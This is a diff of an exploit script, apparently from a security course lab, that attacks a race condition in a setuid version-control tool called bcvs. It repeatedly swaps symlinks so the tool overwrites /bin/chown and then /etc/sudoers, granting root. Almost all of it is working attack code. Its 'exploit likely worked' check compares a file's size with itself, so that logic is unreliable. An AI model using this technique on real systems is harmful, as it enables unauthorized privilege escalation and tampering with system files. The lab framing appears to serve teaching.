@@ -30,12 +30,14 @@ rm -f run_bcvs.py
 cat <<EOS > "run_bcvs.py"
 #!/usr/bin/python
 import os, sys
+import time
 import signal
 import subprocess as sub
 
 bcvs_exe="/opt/bcvs/bcvs"
 target_file="$TARGET_FILE"
 local_file="$LOCAL_FILE"
+repo_dir="$REPODIR"
 exit = False
 
 def handler(signum, frame):
@@ -80,7 +82,7 @@ def create_local():
       sys.exit(0)
 
 def usage():
-  print("Usage: {} <mode> [ci|co](only if using runner mode) -- You probably want 'co'".format(sys.argv[0]))
+  print("Usage: {} <mode> [ci|co](only if using runner mode) [local_file] [target_file]".format(sys.argv[0]))
 
 if __name__ == '__main__':
   if len(sys.argv) < 2:
@@ -90,36 +92,103 @@ if __name__ == '__main__':
   signal.signal(signal.SIGINT, handler)
 
   if (sys.argv[1] == "runner"):
-    if len(sys.argv) != 3:
+    print("Starting run_bcvs as runner")
+    if len(sys.argv) < 3:
       usage()
       sys.exit(1)
+
+    if len(sys.argv) > 3:
+      local_file = sys.argv[3]
+
+    print("Runner (local: {})".format(local_file))
+
     while not exit:
       # Just spam bcvs until the race condition hits
       print("Running bcvs")
       run_bcvs(sys.argv[2])
+
   elif (sys.argv[1] == "linker"):
+    print("Starting run_bcvs as linker")
+    if len(sys.argv) > 2:
+      local_file = sys.argv[2]
+    if len(sys.argv) > 3:
+      target_file = sys.argv[3]
+
+    print("Linker (local: {}, target: {})".format(local_file, target_file))
     while not exit:
       # Link and unlink the file we want to modify
       print("Removing file link")
-      create_link()
+      create_local()
+      time.sleep(0.05)
       print("Linking to target")
       link_to_target()
+      time.sleep(0.04)
 
+      sz_target = os.stat(target_file).st_size
+      sz_repo = os.stat(target_file).st_size
+      if sz_target == sz_repo:
+        print("Repo file and target file have same size. Exploit likely worked.")
+        exit = True
+        break
+
+    sys.exit(0)
 EOS
 chmod +x run_bcvs.py
 
-export USER=root
+OFFSET=361
+ATTACK_STR_BASE="noobnoobnoobnoobnoobnoobnoobnoobnoobnoobnoobnoobnoobnoob00"
+ATTACK_STR_SUDO="${ATTACK_STR_BASE}0440"
+ATTACK_STR_OTHER="${ATTACK_STR_BASE}0777"
+echo "ATTACK_STR_BASE (length: ${#ATTACK_STR_BASE}): $ATTACK_STR_BASE"
+echo "ATTACK_STR_SUDO (length: ${#ATTACK_STR_SUDO}): $ATTACK_STR_SUDO"
+echo "ATTACK_STR_OTHER (length: ${#ATTACK_STR_OTHER}): $ATTACK_STR_OTHER"
+
+# First we need to try and overwrite the chown executable
+# Since we are nice attackers we will first backup the current one. Still
+# need a root shell to copy it back
+if [[ ! -f "~/chown.save" ]]; then
+  cp /bin/chown ~/chown.save
+fi
+
+export USER=student
+
+LOCAL_FILE=$ATTACK_STR_OTHER
+touch $LOCAL_FILE
+touch ${REPODIR}/${LOCAL_FILE}
 
 echo "Starting attack in `pwd`"
-# Now start up both ends of the exploit
-./run_bcvs.py runner co &
+echo "USER=$USER"
+./run_bcvs.py runner co ${LOCAL_FILE} &
 RUNNER_PID=$!
 
-./run_bcvs.py linker &
+./run_bcvs.py linker ${LOCAL_FILE} "/bin/chown" &
 LINKER_PID=$!
 
-trap "echo \"Killing attack processes\" kill -9 $RUNNER_PID; kill -9 $LINKER_PID" SIGINT
+trap "echo \"Killing attack processes\"; kill -9 $RUNNER_PID; kill -9 $LINKER_PID; exit -1" SIGINT
+wait $LINKER_PID
+if [[ $? -ne 0 ]]; then
+  echo "Linker exited with an error. Stopping sploit."
+  kill -9 $RUNNER_PID
+  exit -1
+fi
+
+kill -9 $RUNNER_PID
+
+# ------------------------------------------------------------------
+# Now to overwrite the sudoers file
+export USER=root
+
+LOCAL_FILE=$ATTACK_STR_SUDO
+touch $LOCAL_FILE
+touch ${REPODIR}/${LOCAL_FILE}
+
+./run_bcvs.py runner co ${LOCAL_FILE} &
+RUNNER_PID=$!
+
+./run_bcvs.py linker ${LOCAL_FILE} "/etc/sudoers" &
+LINKER_PID=$!
+
+trap "echo \"Killing attack processes\"; kill -9 $RUNNER_PID; kill -9 $LINKER_PID; exit -1" SIGINT
 
 wait $LINKER_PID
-echo "Linker exited. Killing runner"
 kill -9 $RUNNER_PID
